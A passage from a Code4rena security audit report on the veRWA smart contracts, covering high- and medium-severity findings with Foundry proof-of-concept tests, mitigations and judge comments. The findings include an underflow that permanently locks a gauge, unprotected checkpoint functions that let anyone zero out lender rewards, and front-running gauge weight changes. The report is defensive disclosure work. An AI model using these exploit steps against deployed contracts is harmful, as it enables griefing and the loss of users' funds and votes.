                    pt.slope -= d_slope;
                } else {
                    pt.bias = 0;
                    pt.slope = 0;
                }
                points_weight[_gauge_addr][t] = pt;
                if (t > block.timestamp) time_weight[_gauge_addr] = t;
            }
```

There are two possible scenarios:

*   `pt.bias > d_bias`
*   `pt.bias <= d_bias`

The first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.

However, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`

`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).

Then, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.

After some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.

We will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.

If this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.

It's because, the following functions:

*   `checkpoint_gauge`
*   `gauge_relative_weight_write`
*   `gauge_relative_weight`
*   `_change_gauge_weight`
*   `change_gauge_weight`
*   `vote_for_gauge_weights`
*   `remove_gauge`

call `_get_weight` at some point.

Let's see what will happen in `_get_weight` when it's called:

```solidity
                uint256 d_bias = pt.slope * WEEK;
                if (pt.bias > d_bias) {
                    pt.bias -= d_bias;
                    uint256 d_slope = changes_weight[_gauge_addr][t];
                    pt.slope -= d_slope;
                } else {
```

We will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:

*   Subtract `d_bias` from `pt.bias` which will succeed
*   Attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`

However, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it).

If this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:

*   `vote_for_gauge_weights` will revert
*   `change_gauge_weight` will revert

as they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.

So, in short, the scenario is as follows:

1.  Users allocate their voting power to a gauge `X`.
2.  Governance at some point decreases the weight of `X`.
3.  Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.
4.  Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.
5.  Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.
6.  `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.

**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.

### Impact

As stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.

In order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:

1.  `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.
2.  It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).
3.  The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.
4.  The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.

So, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).

### Proof of Concept

Please run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power. The following import will also have to be added: `import {Test, stdError} from "forge-std/Test.sol";`.

<details>

```solidity
function testPoC1() public
    {
        // gauge is being set up
        vm.startPrank(gov);
        gc.add_gauge(gauge1);
        gc.change_gauge_weight(gauge1, 0);
        vm.stopPrank();

        // `user1` pays some money and adds his power to `gauge1`
        vm.startPrank(user1);
        ve.createLock{value: 1 ether}(1 ether);
        gc.vote_for_gauge_weights(gauge1, 10000);
        vm.warp(block.timestamp + 10 weeks);
        gc.checkpoint_gauge(gauge1);
        vm.stopPrank();

        // `user2` does the same
        vm.startPrank(user2);
        ve.createLock{value: 1 ether}(1 ether);
        gc.vote_for_gauge_weights(gauge1, 10000);
        vm.warp(block.timestamp + 1 weeks);
        gc.checkpoint_gauge(gauge1);
        vm.stopPrank();

        vm.warp(block.timestamp + 1825 days - 14 weeks);
        vm.startPrank(gov);
        // weight is changed to `0`, just to simplify
        // normally, weight would just be decreased here and then subsequently decreased by users when their
        // locking period is over until it finally drops to `0`
        // alternatively, some whale can frontrun a call to `change_gauge_weight` as described and then
        // withdraw his voting power leaving the gauge with `0` slope and `0` bias
        gc.change_gauge_weight(gauge1, 0);
        vm.warp(block.timestamp + 1 weeks);
        
        // now, weight is changed to some bigger value
        gc.change_gauge_weight(gauge1, 1 ether);
        vm.stopPrank();
        // some time passes so that user1's locking period ends
        vm.warp(block.timestamp + 5 weeks);
        
        // `user2` cannot change his weight although his `locked.end` is big enough
        vm.prank(user2);
        vm.expectRevert(stdError.arithmeticError);
        gc.vote_for_gauge_weights(gauge1, 0);

        // governance cannot change weight
        vm.startPrank(gov);
        vm.expectRevert(stdError.arithmeticError);
        gc.change_gauge_weight(gauge1, 2 ether);
        
        // governance cannot even remove the gauge
        // it's now impossible to do anything on gauge1
        vm.expectRevert(stdError.arithmeticError);
        gc.remove_gauge(gauge1);
        vm.stopPrank();
    }
```

</details>

### Tools Used

VS Code

### Recommended Mitigation Steps

Perform `pt.slope -= d_slope` in `_get_weight` only when `pt.slope >= d.slope` and otherwise zero it out.

**[\_\_141345\_\_ (Lookout) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1678343307):**
 > `pt.slope -= d_slope` underflow, DoS gauge operation.
 
**[OpenCoreCH (veRWA) confirmed](https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1681957273)**

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/206#issuecomment-1693869666):**
 > This finding does a great job at describing the vulnerability and its impact from a computational point of view, including an executable PoC. Its duplicate [#386](https://github.com/code-423n4/2023-08-verwa-findings/issues/386) is also worthy of note since it explains the root cause from a mathematical point of view. Although this finding was selected as best, both findings should be read for their complementary points of view.

***

## [[H-06] Users may be forced into long lock times to be able to undelegate back to themselves](https://github.com/code-423n4/2023-08-verwa-findings/issues/182)
*Submitted by [ADM](https://github.com/code-423n4/2023-08-verwa-findings/issues/182), also found by lsaudit ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/411), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/135)), [QiuhaoLi](https://github.com/code-423n4/2023-08-verwa-findings/issues/355), Jorgect ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/264), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/255)), [SpicyMeatball](https://github.com/code-423n4/2023-08-verwa-findings/issues/245), bart1e ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/235), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/218)), [Yanchuan](https://github.com/code-423n4/2023-08-verwa-findings/issues/223), [3docSec](https://github.com/code-423n4/2023-08-verwa-findings/issues/116), [MrPotatoMagic](https://github.com/code-423n4/2023-08-verwa-findings/issues/58), nemveer ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/458), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/389)), [Yuki](https://github.com/code-423n4/2023-08-verwa-findings/issues/407), [kaden](https://github.com/code-423n4/2023-08-verwa-findings/issues/375), nonseodion ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/369), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/344)), [Watermelon](https://github.com/code-423n4/2023-08-verwa-findings/issues/362), [RandomUser](https://github.com/code-423n4/2023-08-verwa-findings/issues/312), BenRai ([1](https://github.com/code-423n4/2023-08-verwa-findings/issues/230), [2](https://github.com/code-423n4/2023-08-verwa-findings/issues/225)), [cducrest](https://github.com/code-423n4/2023-08-verwa-findings/issues/224), [Topmark](https://github.com/code-423n4/2023-08-verwa-findings/issues/212), [Tendency](https://github.com/code-423n4/2023-08-verwa-findings/issues/209), [0xDING99YA](https://github.com/code-423n4/2023-08-verwa-findings/issues/178), and [Kow](https://github.com/code-423n4/2023-08-verwa-findings/issues/82)*

Due to a check requiring users only be able to delegate to others or themselves with longer lock times and verwa's restrictions of all changes increasing lock times by 5 years users may be forced to remain delegated to someone they do not wish to be or extend their lock much longer than they wish.

### Proof of Concept

If a user does not delegate to another user who started their lock during the same epoch they will be unable to undelegate back to themselves without extending their own lock. This is not much of an issue if they wish to do so early in the lock period but can become a problem if they wish to delegate to themselves after a longer period of time. i.e.

1.  Bob creates lock in week 1.
2.  Dave create lock in week 2 & Bob delegates to Dave.
3.  3 years pass and Bob decides he wishes to undelegate his votes back to himself and calls delegate(msg.sender) but the call will fail due to the check in VotingEscrow#L384:

```Solidity
require(toLocked.end >= fromLocked.end, "Only delegate to longer lock");
```

4.  In the original FiatDAO contracts a user would be able to just extend their lock by one week to get around this however any changes in the verwa contract results in an extension of 5 years which the user may not want extend their lock by such a long time just to be able to undelegate.

The undelegate fail can be shown by modifying the test testSuccessDelegate to:

```Solidity
    function testSuccessDelegate() public {
        // successful delegate
        testSuccessCreateLock();
        vm.warp(8 days); // warp more than 1 week so both users are not locking in same epoch
        vm.prank(user2);
        ve.createLock{value: LOCK_AMT}(LOCK_AMT);
        vm.prank(user1);
        ve.delegate(user2);
        (, , , address delegatee) = ve.locked(user1);
        assertEq(delegatee, user2);
        (, , int128 delegated, ) = ve.locked(user2);
        assertEq(delegated, 2000000000000000000);
    }
```

and running:<br>
forge test `--match testSuccessUnDelegate`

### Recommended Mitigation Steps

Modify VotingEscrow#L384 to:

```Solidity
require(toLocked.end >= locked_.end, "Only delegate to self or longer lock");
```

which will allow users to delegate either to longer locks or undelegate back to themselves.

**[alcueca (Judge) increased severity to High and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/182#issuecomment-1696857059):**
 > I'm merging [#245](https://github.com/code-423n4/2023-08-verwa-findings/issues/245) into this one as the root cause and general mechanics are the same, only that in the 245 group the intent was malicious and in this group is not.
> 
> At the same time, I'm upgrading the severity to High. Locking CANTO for an additional 5 years, considering that this is by nature a volatile environment, has an extremely high chance of resulting in losses due to market movements or other factors.

**[OpenCoreCH (veRWA) confirmed on duplicate 178](https://github.com/code-423n4/2023-08-verwa-findings/issues/178)**


***

## [[H-07] lack of access control in `LendingLedger.sol#checkpoint_lender` and function `checkpoint_market`](https://github.com/code-423n4/2023-08-verwa-findings/issues/142)
*Submitted by [ladboy233](https://github.com/code-423n4/2023-08-verwa-findings/issues/142)*

_Note: This audit was preceded by a [Code4rena Test Coverage competition](https://code4rena.com/test-coverage). While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [H-07] was discovered during that period and is being included here for completeness._

User's claim and `sync_lender` will be griefed at low cost.

### Proof of Concept

<details>

```solidity
   /// @notice Trigger a checkpoint explicitly.
    ///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)
    /// @param _market Address of the market
    /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.
    function checkpoint_market(
        address _market,
        uint256 _forwardTimestampLimit
    ) external is_valid_epoch(_forwardTimestampLimit) {
        require(
            lendingMarketTotalBalanceEpoch[_market] > 0,
            "No deposits for this market"
        );
        _checkpoint_market(_market, _forwardTimestampLimit);
    }

    /// @param _market Address of the market
    /// @param _lender Address of the lender
    /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.
    function checkpoint_lender(
        address _market,
        address _lender,
        uint256 _forwardTimestampLimit
    ) external is_valid_epoch(_forwardTimestampLimit) {
        require(
            lendingMarketBalancesEpoch[_market][_lender] > 0,
            "No deposits for this lender in this market"
        );
        _checkpoint_lender(_market, _lender, _forwardTimestampLimit);
    }
```

</details><br>

These two functions lack access control, the caller is never validated, meaning anyone can call this function.

The market is not validated to see if the market is whitelisted or not.

The timestamp is never validated, the is\_valid\_epoch(\_forwardTimestampLimit) is insufficient.

```solidity
  /// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity
    /// @param _timestamp Timestamp to check
    modifier is_valid_epoch(uint256 _timestamp) {
        require(
            _timestamp % WEEK == 0 || _timestamp == type(uint256).max,
            "Invalid timestamp"
        );
        _;
    }
```

The user can just pick a past timestamp as the \_forwardTimestampLimit.

For example, if we set \_forwardTimestampLimit to 0.

Then for example in \_checkpoint_market

```solidity
   function _checkpoint_market(
        address _market,
        uint256 _forwardTimestampLimit
    ) private {
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        uint256 lastMarketUpdateEpoch = lendingMarketTotalBalanceEpoch[_market];
        uint256 updateUntilEpoch = Math.min(currEpoch, _forwardTimestampLimit);
        if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {
            // Fill in potential gaps in the market total balances history
            uint256 lastMarketBalance = lendingMarketTotalBalance[_market][
                lastMarketUpdateEpoch
            ];
            for (
                uint256 i = lastMarketUpdateEpoch;
                i <= updateUntilEpoch;
                i += WEEK
            ) {
                lendingMarketTotalBalance[_market][i] = lastMarketBalance;
            }
        }
        lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch;
    }
```

We set the lendingMarketTotalBalanceEpoch\[\_market] to 0.

Then if the next call of the \_checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0.

Over time, even when the for loop inside \_checkpoint_market does run, the caller are forced to pay very high gas fee.

Same issue applies to \_checkpoint_lender as well.

User can decrease lendingMarketBalancesEpoch, even to 0.

Basically, if a malicious actor call these two function with forwardTimestampLimit 0.

Then the \_checkpoint\_lender and \_checkpoint_market would never run inside sync\_ledger and claim reward.

Because user's reward can be griefed to 0 and stated are failed to updated properly.

**POC 1:**

<details>

```solidity
  function testLackOfAccessControlSyncMarket_POC_1() public {
        payable(ledger).transfer(1000 ether);
        uint248 amountPerEpoch = 1 ether;

        uint256 fromEpoch = WEEK * 5;
        uint256 toEpoch = WEEK * 10;

        address lendingMarket = vm.addr(5201314);

        vm.prank(goverance);
        ledger.setRewards(fromEpoch, toEpoch, amountPerEpoch);
      
        vm.warp(block.timestamp + WEEK);

        vm.prank(goverance);
        ledger.whiteListLendingMarket(lendingMarket, true);
        address lender = users[1];
        vm.startPrank(lendingMarket);

        int256 deltaStart = 1 ether;
        uint256 epochStart = (block.timestamp / WEEK) * WEEK;
        ledger.sync_ledger(lender, deltaStart);

        // gaps of 3 week
        uint256 newTime = block.timestamp + 3 * WEEK;
        vm.warp(newTime);
        int256 deltaEnd = 1 ether;
        uint256 epochEnd = (newTime / WEEK) * WEEK;
        ledger.sync_ledger(lender, deltaEnd);

        newTime = block.timestamp + 20 * WEEK;
        vm.warp(newTime);

        console.log("---sync ledger after set the update epoch to 0 --");

        // ledger.checkpoint_market(lendingMarket, 0);
        // ledger.checkpoint_lender(lendingMarket, lender, 0);
        ledger.sync_ledger(lender, deltaEnd);

        vm.stopPrank();
        vm.prank(lender);

        uint256 balanceBefore = address(lender).balance;
        ledger.claim(lendingMarket, fromEpoch, toEpoch);
        uint256 balanceAfter = address(lender).balance;
        console.log(balanceAfter - balanceBefore);

        vm.expectRevert("No deposits for this user");
        ledger.claim(lendingMarket, fromEpoch, toEpoch);
    }
```

</details><br>

If we run the POC, we get the normal result, user can claim and get 6 ETH as reward.

```solidity
 ---sync ledger after set the update epoch to 0 --
 6000000000000000000
```

If we uncomment:

```solidity
  // ledger.checkpoint_market(lendingMarket, 0);
  // ledger.checkpoint_lender(lendingMarket, lender, 0);
```

The claimed reward goes to 0.

### Recommended Mitigation Steps

Add access control to checkpoint\_market and checkpoint\_lender.

**[OpenCoreCH (veRWA) confirmed and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/142#issuecomment-1680549736):**
 > This was a valid issue before the auditing contest (uncovered during the testing contest and fixed before the auditing contest), pasting my comment from there for reference:
> 
> Good point. It is generally intended that everyone can call these functions (should not be necessary in practice, but may be in some edge cases where a market was inactive for years) and I do not think that this is problematic per se. However, the problem here is that users can decrease `lendingMarketBalancesEpoch` or `lendingMarketTotalBalanceEpoch`, which should never happen. So I will probably change the code like this (and the same for lenders) such that this can never happen:
> ```solidity
>         if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {
>             // Fill in potential gaps in the market total balances history
>             uint256 lastMarketBalance = lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];
>             for (uint256 i = lastMarketUpdateEpoch; i <= updateUntilEpoch; i += WEEK) {
>                 lendingMarketTotalBalance[_market][i] = lastMarketBalance;
>             }
>             if (updateUntilEpoch > lastMarketUpdateEpoch) {
>                 lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch;
>             }
>         }
> ```

***

## [[H-08] If governance removes a gauge, user's voting power for that gauge will be lost](https://github.com/code-423n4/2023-08-verwa-findings/issues/62)
*Submitted by [thekmj](https://github.com/code-423n4/2023-08-verwa-findings/issues/62), also found by [mert\_eren](https://github.com/code-423n4/2023-08-verwa-findings/issues/449), [popular00](https://github.com/code-423n4/2023-08-verwa-findings/issues/364), [Eeyore](https://github.com/code-423n4/2023-08-verwa-findings/issues/349), [immeas](https://github.com/code-423n4/2023-08-verwa-findings/issues/279), [bart1e](https://github.com/code-423n4/2023-08-verwa-findings/issues/186), [0xCiphky](https://github.com/code-423n4/2023-08-verwa-findings/issues/174), [ltyu](https://github.com/code-423n4/2023-08-verwa-findings/issues/147), [0xbrett8571](https://github.com/code-423n4/2023-08-verwa-findings/issues/132), [deadrxsezzz](https://github.com/code-423n4/2023-08-verwa-findings/issues/87), [0xDetermination](https://github.com/code-423n4/2023-08-verwa-findings/issues/409), [Tripathi](https://github.com/code-423n4/2023-08-verwa-findings/issues/353), [Team\_Rocket](https://github.com/code-423n4/2023-08-verwa-findings/issues/276), and [pep7siup](https://github.com/code-423n4/2023-08-verwa-findings/issues/81)*

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L127-L132> 

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213> 

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L241>

If governance removes a gauge for any (non-malicious) reason, a user's voting power for that gauge will be completely lost.

### Vulnerability details

The `GaugeController` is a solidity port of Curve DAO's Vyper implementation. Users are to vote for channeling incentives by using the `vote_for_gauge_weights()` function, and each user can fraction their voting power by $10000$ (that is, defined by BPS).

One modification from the original is that governance can now remove gauges, not allowing users to vote on it. However, any existing individual user's voting power before removal is not reset. Since `vote_for_gauge_weights()` does not allow voting for removed gauges, the voting power is then forever lost.

Consider the following scenario:

*   Alice has some veRWA, and is now able to vote.
*   She votes on some pool, say, G1, using 100% of her voting power.
*   Pool G1 is removed by governance due to any reason. Perhaps the pool was found to be faulty and liquidity should be migrated, perhaps the market itself has became illiquid and unsafe, perhaps the intended incentives duration for that pool has simply expired.
*   Alice still has 100% of her voting power in that pool, but she cannot remove her vote and claim the voting power back.

It is worth noting that, even if Alice does not use 100% of her voting power on that particular gauge, she would still lose whatever percent vote placed in that pool, and her overall voting power was weakened by said percent.

### Impact

Users can lose their voting power.

### Proof of concept

We provide the following POC to use on `GaugeController` tests.

<details>

```solidity
function testPOC() public {
    // prepare
    uint256 v = 10 ether;
    vm.deal(gov, v);
    vm.startPrank(gov);
    ve.createLock{value: v}(v);

    // add gauges
    gc.add_gauge(gauge1);
    gc.change_gauge_weight(gauge1, 100);
    gc.add_gauge(gauge2);
    gc.change_gauge_weight(gauge2, 100);

    // all-in on gauge1
    gc.vote_for_gauge_weights(gauge1, 10000);

    // governance removes gauge1
    gc.remove_gauge(gauge1);

    // cannot vote for gauge2
    vm.expectRevert("Used too much power");
    gc.vote_for_gauge_weights(gauge2, 10000);

    // cannot remove vote for gauge1
    vm.expectRevert("Invalid gauge address"); // @audit remove when mitigate
    gc.vote_for_gauge_weights(gauge1, 0);

    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)
    vm.expectRevert("Used too much power");  // @audit remove when mitigate
    gc.vote_for_gauge_weights(gauge2, 10000);
}
```

</details>

### Tools used

Forge

### Recommended mitigation steps

The simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:

```solidity
require(_user_weight == 0 || isValidGauge[_gauge_addr], "Can only vote 0 on non-gauges");
```

<https://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213>

The given POC can then be the test case to verify successful mitigation.

As a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.

***
# Medium Risk Findings (3)
## [[M-01] Users can front-run calls to `change_gauge_weight` to gain extra voting power](https://github.com/code-423n4/2023-08-verwa-findings/issues/294)
*Submitted by [deadrxsezzz](https://github.com/code-423n4/2023-08-verwa-findings/issues/294)*

Users can get extra voting power by front-running calls to `change_gauge_weight`.

### Proof of Concept

It can be expected that in some cases calls will be made to `change_gauge_weight` to increase or decrease a gauge's weight. The problem is users can be monitoring the mempool expecting such calls. Upon seeing such, any people who have voted for said gauge can just remove their vote prior to `change_gauge_weight`. Once it executes, they can vote again for their gauge, increasing its weight more than it was expected to be:
Example:

1.  Gauge has 1 user who has voted and contributed for 10\_000 weight
2.  They see an admin calling `change_gauge_weight` with value 15\_000.
3.  User front-runs it and removes all their weight. Gauge weight is now 0.
4.  Admin function executes. Gauge weight is now 15\_000
5.  User votes once again for the gauge for the same initial 10\_000 weight. Gauge weight is now 25\_000.

Gauge weight was supposed to be changed from 10\_000 to 15\_000, but due to the user front-running, gauge weight is now 25\_000.

### Recommended Mitigation Steps

Instead of having a set function, use increase/ decrease methods.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1696444632):**
 > Votes are only counted at the first second of an epoch, front-running `change_gauge_weight` won't do anything.

**[deadrxsezzz (Warden) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1697283221):**
 > Hey, I'm leaving a simple PoC showcasing the issue and the respective logs from it:

<details>

> ```solidity
>     function testWithFrontRun() public { 
>         vm.startPrank(gov);
>         gc.add_gauge(gauge1);
>         gc.change_gauge_weight(gauge1, 0);
>         vm.stopPrank();
> 
>         vm.startPrank(user1);
>         ve.createLock{value: 1 ether}(1 ether);
>         gc.vote_for_gauge_weights(gauge1, 10000);
>         uint weight = gc.get_gauge_weight(gauge1);
>         console.log("gauge's weight after voting: ", weight);
>         vm.stopPrank();
> 
>         vm.prank(user1);
>         gc.vote_for_gauge_weights(gauge1, 0); // front-run transaction by user
>         vm.prank(gov);
>         gc.change_gauge_weight(gauge1, 1000000000000000000);
> 
>         vm.startPrank(user1);
>         gc.vote_for_gauge_weights(gauge1, 10000); // back-run
>         weight = gc.get_gauge_weight(gauge1);
>         console.log("gauge's weight after changing weight: ", weight);
>         vm.stopPrank();
>     }
> 
>         function testWithoutFrontRun() public { 
>         vm.startPrank(gov);
>         gc.add_gauge(gauge1);
>         gc.change_gauge_weight(gauge1, 0);
>         vm.stopPrank();
> 
>         vm.startPrank(user1);
>         ve.createLock{value: 1 ether}(1 ether);
>         gc.vote_for_gauge_weights(gauge1, 10000);
>         uint weight = gc.get_gauge_weight(gauge1);
>         console.log("gauge's weight after voting: ", weight);
>         vm.stopPrank();
> 
>         vm.prank(gov);
>         gc.change_gauge_weight(gauge1, 1000000000000000000);
> 
>         weight = gc.get_gauge_weight(gauge1);
>         console.log("gauge's weight after government changes weight: ", weight);
>     }
> ```
> ```
> [PASS] testWithFrontRun() (gas: 702874)
> Logs:
>   gauge's weight after voting:  993424657416307200
>   gauge's weight after changing weight:  1993424657416307200
> ```
> ```
> [PASS] testWithoutFrontRun() (gas: 674264)
> Logs:
>   gauge's weight after voting:  993424657416307200
>   gauge's weight after government changes weight:  1000000000000000000
> ```

</details>

**[OpenCoreCH (veRWA) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1698572717):**
> 
> In practice the function should only be used to set the weights to 0 (e.g., when a market got exploited and not all users withdrew their votes yet). But there is nothing that prevents it from setting it to a higher or lower value (at least not in the audited codebase, added that in the meantime). So what is described in the finding is generally true, although it does not require frontrunning or anything like that, because the function just changes the current voting result, anyway. So if voting for the market is not restricted afterwards (by removing it from the whitelist), people can continue to vote on it and the final vote result may be different than what governance has set with this function.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/294#issuecomment-1698576798):**
 > From what I understand the function is essentially broken, and a Medium severity is appropriate given that wardens can't assume that it will be used only to set the weights to 0 for non-whitelisted markets.

**[OpenCoreCH (veRWA) confirmed on duplicate 401](https://github.com/code-423n4/2023-08-verwa-findings/issues/401)**

***

## [[M-02] Upon IncreaseAmount the lock may not align to the nearest weekly increment](https://github.com/code-423n4/2023-08-verwa-findings/issues/145)
*Submitted by [gzeon](https://github.com/code-423n4/2023-08-verwa-findings/issues/145)*

_Note: This audit was preceded by a [Code4rena Test Coverage competition](https://code4rena.com/test-coverage). While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [M-02] was discovered during that period and is being included here for completeness._

In most other places, locks are created with the end time rounded down to nearest weekly increment using the `_floorToWeek` function.

<https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L422-L426>

```solidity
    // @dev Floors a timestamp to the nearest weekly increment
    // @param _t Timestamp to floor
    function _floorToWeek(uint256 _t) internal pure returns (uint256) {
        return (_t / WEEK) * WEEK;
    }
```

However in IncreaseAmount, it is simply set to `block.timestamp + LOCKTIME` without the rounding:

<https://github.com/OpenCoreCH/test-squad-verwa/blob/461b7d99a30e8fee57ba97c2262f6b0c5e4704b6/src/VotingEscrow.sol#L301-L302>

```solidity
        newLocked.end = block.timestamp + LOCKTIME;

```

**[\_\_141345\_\_ (Lookout) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1677597116):**
 > Locked.end will affect the delegate/undelegate requirement, such as the following check.
> 
> ```solidity
> File: src\VotingEscrow.sol
> 382:         require(toLocked.amount > 0, "Delegatee has no lock");
> 383:         require(toLocked.end > block.timestamp, "Delegatee lock expired");
> 384:         require(toLocked.end >= fromLocked.end, "Only delegate to longer lock");
> ```

**[OpenCoreCH (veRWA) confirmed and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1680753041):**
 > This was discovered during the testing contest and fixed before the audit contest, pasting my comment here for reference:
> 
> Good catch, I think that would mess up the `_checkpoint` logic which implicitly assumes that the lock times are aligned, so will definitely be fixed.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/145#issuecomment-1695861935):**
 > Impact from sponsor:
> > These slope changes would not have been applied (neither the user-specific ones, nor the global ones), resulting in wrong slopes. And if many users did this, many slopes would be messed up at some point, leading to wrong votes / relative votes.

***

## [[M-03] Replace `old_sum_bias` by `old_bias`](https://github.com/code-423n4/2023-08-verwa-findings/issues/140)
*Submitted by [Franfran](https://github.com/code-423n4/2023-08-verwa-findings/issues/140)*

_Note: This audit was preceded by a [Code4rena Test Coverage competition](https://code4rena.com/test-coverage). While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [M-03] was discovered during that period and is being included here for completeness._

```diff
diff --git a/src/GaugeController.sol b/src/GaugeController.sol
index 68b832a..1794639 100644
--- a/src/GaugeController.sol
+++ b/src/GaugeController.sol
@@ -250,7 +250,7 @@ contract GaugeController {
         uint256 old_sum_slope = points_sum[next_time].slope;
 
         points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;
-        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_sum_bias) - old_bias;
+        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;
         if (old_slope.end > next_time) {
             points_weight[_gauge_addr][next_time].slope =
                 Math.max(old_weight_slope + new_slope.slope, old_slope.slope) -
```

**[OpenCoreCH (veRWA) confirmed and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1680746162):**
